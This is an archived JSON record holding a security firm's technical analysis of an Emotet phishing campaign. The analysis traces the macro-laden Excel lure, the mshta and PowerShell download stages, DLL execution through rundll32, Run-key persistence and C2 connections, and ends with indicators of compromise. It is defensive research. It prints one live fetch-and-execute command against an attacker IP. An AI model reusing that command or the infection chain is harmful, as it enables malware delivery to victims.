{
    "id": "3f1824ab-ae77-4583-ae42-c94c5e8459ed",
    "created_at": "2023-01-12T15:08:26.185441Z",
    "updated_at": "2025-03-27T02:08:40.191147Z",
    "deleted_at": null,
    "sha1_hash": "6384415d6635f4617b7ccc6fb02395fdbc6417f5",
    "title": "2022-02-13 - Technical Malware Analysis- The Return of Emotet",
    "authors": "",
    "file_creation_date": "2022-05-28T21:46:00Z",
    "file_modification_date": "2022-05-28T21:46:00Z",
    "file_size": 7652428,
    "plain_text": "# Technical Malware Analysis: The return of Emotet\n\n**[notes.netbytesec.com/2022/02/technical-malware-analysis-return-of.html](https://notes.netbytesec.com/2022/02/technical-malware-analysis-return-of.html)**\n\nFareed\n\n_This post was authored by Taqi, Rosamira and Fareed._\n\n## Overview\n\nNetbyteSEC malware analyst team has come across a Microsoft Excel document containing\na malicious macro code. The suspicious email was received by our client. The malicious\nattachment seems to be an Emotet malware that is often used in phishing campaigns.\n\nEmotet is a Trojan that primarily spreads through malicious spam attachments pretending to\nbe invoices, shipping documents, delivery notification, etc. The attachment may arrive either\nvia malicious script, macro-enabled document files, or malicious link, which will download the\nEmotet excutable upon execution. The Emotet emails may contain familiar branding\ndesigned to look like a legitimate email. Emotet may try to persuade users to click the\nmalicious file.\nThe scenario of the analysis is as follows:\n\n\n-----\n\nFigure 1: Flow of Emotet Attack\n\n## Email analysis\n\n### Spearphishing Attachment\n\nUpon opening the victim’s suspicious email attachment. The attachment is encrypted with the\ngiven password \"1843\". Since the attachment was encrypted, the Google mail server cannot\nscan for viruses. It was normal for an organization to encrypt their attachment however, the\nreceiver should be aware of potential malicious content when received via email.\n\n\n-----\n\nFigure 2 : Email details\n\nInvestigating the email, Netbytesec malware analyst noticed that the attackers used DNS\nname spoofing to impersonate their display name as a legitimate user. Also, attached to the\nemail is an attachment of a zip file containing payload of the attackers.\n\n## Malicious document analysis\n\nFurther analysis will focus on the malicious document (XLS) used as the lure inside the\npassword protected zip file.\n\nMD5 Hash: 25995b47257212e2e3ca5f7704c9e830\n\nFilename: untitled_176399.xls\n\nFile Type: Excel Binary File Format (.xls)\n\nUpon opening the malicious document, the attacker used a common tactic deployed by\ncybercriminals to trick victims to click the “Enable Content” ribbon button display in Microsoft\nExcel as shown in Figure 3 below. Unsuspected victim will enable the content macro thus\nleading to the malicious script being executed in the background stealthily without the\nvictim’s knowledge.\n\n\n-----\n\nFigure 3 : Opening the malicious document\nEnabling the content will execute the macro embedded in the lure document which will lead\nto malicious macro execution.\n\nInvestigating the Excel file, Netbytesec malware analyst found that there is a malicious Excel\n4.0 macro stored inside the Excel file.\n\nFigure 4 : Results from OleVBA3 against the malicious attachment\nAs shown in the figure 4 above, the malicious code will try to execute an obfuscated code of\n_mshta http://91.240.118.168/oo/aa/se.html via CMD._\n\n\n-----\n\nNext, Netbytesec malware analysts perform VirusTotal lookup to check for any further clues\non the IP address found in the VBA macro. It seems that 16 security vendors in VirusTotal\nflagged the IP address as malicious as shown in following figure.\n\nFigure 5 : 16 security vendors flagged this IP address as malicious.\nFuthermore, the community in VirusTotal also mentioned that the IP address is a collection of\nIP addresses used for the Emotet malware campaign. This convinces Netbytesec malware\nanalyst that the IP address found in the Excel 4.0 macro is one of the Indicator of\nCompromise for the Emotet campaign.\n\nOnce the malicious document (maldoc) opens and enables the macro, the maldoc runs the\nmacro code and downloads the se.html which contains malicious javascript payload. The\ndeobfuscated Macro VBA code from the malicious excel document would look like this:\n```\nCMD.EXE /c mshta http://91.240.118.168/oo/aa/se.html\n\n```\nThis malicious code uses mshta.exe which will fetch and execute HTA code in the se.html.\nThe usage of mshta.exe is a common technique used by malicious attackers to execute\nMicrosoft HTML Application (HTA) files. Mshta may execute Windows Script Host code\n(VBScript and JScript) contained within HTML, as its full name suggests. In this scenario, the\ncode se.html was a javascript and visual basic scripting payload.\n\nBased on the PCAP analaysis, below figure shows the HTTP request and response to the\nserver (91.240.118.61) to fetch se.html. We will explain in the next section about what\n_se.html does in this malicious attachment._\n\n\n-----\n\nFigure 6 : The captured network traffic that is generated by the malicious document.\nUpon opening the malicious HTML file (se.html), the HTML page appears to be protected by\nHTML Guardian per said by the banner in the display.\n\nFigure 7 : Opening the se.html through the web browser\nTrying to read through the browser's view source file also prevents us from getting more\ninformation regarding what the HTML content. Scrolling down the html file, Netbytesec\nmalware analyst discovered some HTML code starting at line 65.\n\n\n-----\n\nFigure 8 : The content of the html file can be seen started at line 65\nNetbytesec malware analyst started to investigate and analyzed the malicious payload\n_se.html and found the code was obfuscated javascript code._\n\nThe figure below shows the obfuscated javascript code that Netbytesec malware analyst\ngained from se.html.\n\nFigure 9 : Obfuscated Javascript se.html\nInspecting the code can see that the most of the script is used for the display page and only\nportion of the code for the malicious payload.\n\nFigure 10 : HTML Structure of se.html\n\n\n-----\n\nFigure 11 : VB script contained in an html file.\nBased on figure 11 above, the syntax “Window.ReSizeTo 0,0” refers to nullifying the size of\nthe script in the webpage. On other hand, ‘visibility:hidden’ hides the appearance of the script\nwhile disabling click-ability on the element.\n\nFigure 12 : Deobfuscated VB script which leads to an obfuscated Powershell command.\n\n\n-----\n\nNext, Netbytesec malware analyst start to investigate the script in the HTML file that does\nthe execution of the obfuscated Powershell commands and able to retrieve the obfuscated\nPowershell payload.\n\n### Command and Scripting Interpreter: Powershell\n\nThe code mentioned in figure 12 are as follow:\n\nFigure 13 : Deobfuscated Powershell code.\nFrom the decoded Powershell, Netbytesec malware analysts looked up the link URL\n_http://91.240.118.168/oo/aa/se.png and found another malicious Powershell script. The_\n_se.png file contains Powershell code as shown in figure below._\n\nFigure 14 : Powershell code from se.png that will downloads malicious DLL from available\nwebsite\nBased on the figure 14 above, the Powershell script basically will download an executable\nfrom the URLs and execute it using Rundll32.exe.\n\n\n-----\n\n## Malicious DLL analysis\n\n### Signed Binary Proxy Execution: Rundll32\n\nAccording to the previous Powershell command, the malicious script downloads the\nmalicious DLL file and saves it at C:\\ProgramData folder with name QWER.DLL. Next, the\nPowershell command will call cmd.exe to execute RunDLL.exe with QWER.DLL as its DLL\npath and \"AADD\" as its arbitrary export.\n\nFigure 15: Powershell execution to run malicious DLL files with arbitrary arguments\nAs shown in the red box in figure below, at the end of the script, the script will execute the\ncommand to begin the DLL binary execution.\n\nFigure 16: DLL execution\n\"AADD\" is the export argument used for executing QWER.DLL. However, the arguments can\nbe anything and arbitrary as long as it is not empty or null in order to run it as intended. After\nthat, a second Powershell execution will be triggered.\n\n\n-----\n\nFigure 17: Rundll32.exe executable running the malicious file with specific arguments,\n‘DllRegisterServer’\n\nThe second execution will only run after the first execution of the malicious DLL which\ncontains arbitrary arguments as a trigger point. The secondary execution contains the real\nentry point of the malicious DLL which uses cmd.exe to call Rundll32.exe with the export\narguments of ‘DllRegisterServer’.\n\nThis behavior can be found in the disassembled code where the malware first will decrypt or\nunpack their code in the heap and then call the address of the unpacked code at the address\n10046FA3 as shown in the figure below.\n\nFigure 18: The sample call the unpacked code\n\nIn the unpack/decrypted code, there are two main functions that the subroutine will do. The\nfirst one is to spawn the Rundll32 command and the second part of the subroutine is to exit\nthe process. When the spawn of the Rundll32 function is being called, it will literally run the\n\n\n-----\n\ncommand with the export name DllRegisterServer which will invoke the DllRegisterServer\nexport function at the second stage.\n\nIn the figure 19 below, the sample build up and import CreateProcessW Windows API from\nkernel32.dll and runs the function which lead to the command execution of Rundll32\napplication.\n\nFigure 19: QWER.DLL sample import CreateProccessW Windows API\n\nDrilling down the inner code of the export DllRegisterServer will gave us a clue what does\nthe function does. The first subroutine in the function will do the unpacking process of the\ncode into an allocated memory and return the address in EAX register. The address then will\nbe invoke at line 0x10045da0 as shown in following figure.\n\n\n-----\n\nFigure 20: DllRegisterServer code\n\nIn this unpacked section, the malware makes the connection to three different C2 IP\naddresses which will be explained in section TA001 Command and Control in the next\nsection ahead.\n\n### Registry Run Keys / Startup Folder\n\nAfter the malware attempts to register at startup of the windows as persistence mechanism,\nit will move and rename QWER.DLL to a new path with a new arbitrary name of DLL and\nnew arbitrary arguments. It will register on HKEY-USERS that contains user-specific\nconfiguration information for all currently active users on the computer.\n\nFigure 21: Malware attempt to register at startup of the windows as persistence mechanism,\nwith alongside new binary with new arguments at new path\n\n\n-----\n\nThe persistence of the malware is set up to be running when the victim starts up their\nmachine through Windows Registry’s register at\n_HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run._\n\nFigure 22: Again, arbitrary arguments is used to trigger and run the new malicious DLL\n\nFigure 23 : New malware with persistence at boot start-up executing DllRegisterServer\n\nAt this point, the malware is well set up and hidden in a new path and persistence. It will run\nevery time the current user is booting up their machine.\n\n### Command and Control\n\nDuring investigation, the communication with the C2 server was captured by Sysmon log\nactivity via port 8080.\n\n\n-----\n\nFigure 24 : Malware communicating with C2 Server of 159.69.43.124:8080\n\nThe TCP connection is initiated to 159.69.43.124 through 8080 port of the server right after\nthe DLL was executed. According to the Sysmon log, the domain name resolved to this IP is\n_clients.your-server.de._\n\nFigure 25 : Virustotal intelligence confirmed that the IP is used for Emotet Command &\nControl server\n\nThe malware uses Windows API InternetConnectW to create the connection to the C2\nserver. As you can see in the following figure, the malware creates the first connection to the\nIP address 159.69.43.124 via 8080 port, the same as detected in the Sysmon log.\n\n\n-----\n\nFigure 26 : Malware connection to first C2 server, 159.69.43.124\nObserving the behavior in the debugger resulting us to discover the second C2 connection.\nThe communication was made to the different IP address which is 45.79.80.198 on port 443.\n\nFigure 27 : Malware making second connection to another C2 server, 45.79.80.198\nInitiating the request of the connection will create the connection as Netbytesec malware\nanalyst observe the network behaviour and step over the HttpSendRequest function.\n\n\n-----\n\nFigure 28 : Malware using HttpSendRequest function\n\n## Conclusion\n\nThe attacker sends email to the targeted victims by spoofing their display name to a\nlegitimate name. However, the email displays still stays the same, which is the original email\nof the Emotet campaign agent. For this specific case, the attacker sent an email to one of the\ntarget using hijacked email thread. In the email is attached an excel file titled\n‘untitled_176399.xls ’. The content of their email contains a malicious script that will execute\nmshta binary in order to download and execute the next malicious payload from\n91.240.118.168.\n\nThe executed malicious payload will download a PNG file from the same IP containing\nPowershell payload that will download malicious DLL from one of the domains, save it at\n_C:/ProgramData with name QWER.DLL. Afet that, it will execute Rundll32.exe to run_\nQWER.DLL with an arbitrary argument. The execution of QWER.DLL with arbitrary argument\nserved as the trigger for the next execution of QWER.DLL with specific argument of\nDllRegisterServer which is the real entrypoint of the DLL.\n\nThe malicious DLL will duplicate itself to a new arbitrary path in C:/<Users>/AppData/Local/\nwith new arbitrary name and arbitrary arguments and register itself in\n_HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run in Windows registry. As a result, the_\nmalicious DLL will be persistent and will be executed every time the user boots up their\nmachine. The persistence malware will communicate with the C2 server at 159.69.43.124\nthrough the port 8080.\n\n## Indicator of Compromises\n\nIP address\n\n91.240.118[.]168\n\n\n-----\n\n159.69.43[.]124:8080 (C2 Servers)\n45.79.80[.]198 (C2 Servers)\n\nDomains\n\nhttp://91.240.118[.]168/oo/aa/se.html\nhttp://91.240.118[.]168/oo/aa/se.png\nhttp://farmmash[.]com/edh2fa/g2Q7Qbgs/\nhttp://karensgardentips[.]com/cgi-bin/hfpv/\nhttp://centrobilinguelospinos[.]com/wp-admin/w8528qkQnMPLDUc/\nhttp://unitedhorus[.]com/wp-content/m3oxVSV2uYW2rbh/\nhttp://vldispatch[.]com/licenses/JE6Ol2dfhrk/\nhttp://il-piccolo-principe[.]com/wp-content/Ua9GvD7acXnDz/\nhttp://hardstonecap[.]com/well-known/ps9kNMgc6/\nhttp://3-fasen[.]com/wp-content/3Bl0hBbW/\nhttp://baldcover[.]com/wp-admin/oRwkRUWpbJ55/\n\nHash\n\n25995b47257212e2e3ca5f7704c9e830 (untitled_176399.xls)\n9bf1102cd38dc1364f54407bb4cb2a (se.html)\n63f0672552a000605e99190036e9676f (se.png)\n74bb69b8ba9d2b649f4de5adb2cf06d9 (QWER.DLL)\n\n[Full report can be seen here](https://docs.google.com/document/d/1FR_hkr6DCHahZrcZM4SFbcNrWy4Nj0xwFhbXWOS-3-Q/edit?usp=sharing)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-02-13 - Technical Malware Analysis- The Return of Emotet.pdf"
    ],
    "report_names": [
        "2022-02-13 - Technical Malware Analysis- The Return of Emotet.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536106,
    "ts_updated_at": 1743041320,
    "ts_creation_date": 1653774360,
    "ts_modification_date": 1653774360,
    "files": {
        "pdf": "https://archive.orkl.eu/6384415d6635f4617b7ccc6fb02395fdbc6417f5.pdf",
        "text": "https://archive.orkl.eu/6384415d6635f4617b7ccc6fb02395fdbc6417f5.txt",
        "img": "https://archive.orkl.eu/6384415d6635f4617b7ccc6fb02395fdbc6417f5.jpg"
    }
}